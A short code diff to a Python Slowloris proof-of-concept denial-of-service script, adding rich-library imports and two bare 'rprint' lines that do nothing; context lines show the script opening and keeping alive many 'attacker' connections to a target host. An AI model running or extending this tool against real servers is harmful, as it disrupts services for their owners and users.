@@ -7,6 +7,8 @@ import string
 import argparse
 import ssl
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+from rich.table import Table
+from rich import print as rprint
 from random import choice, randint
 
 parser = argparse.ArgumentParser(description="Slowloris PoC demonstration in python3")
@@ -86,6 +88,7 @@ def init_attack(nAttackers):
     return attacker(identifier, agent, s)
 
 def main():
+    rprint
     logging.info("Attacking {} with {} attackers".format(host, connections))  
     logging.info("Establishing connections..")
     attackers = []
@@ -98,6 +101,7 @@ def main():
 
     while True:
         try:
+            rprint
             logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
             for s in list(attackers):
                 try:
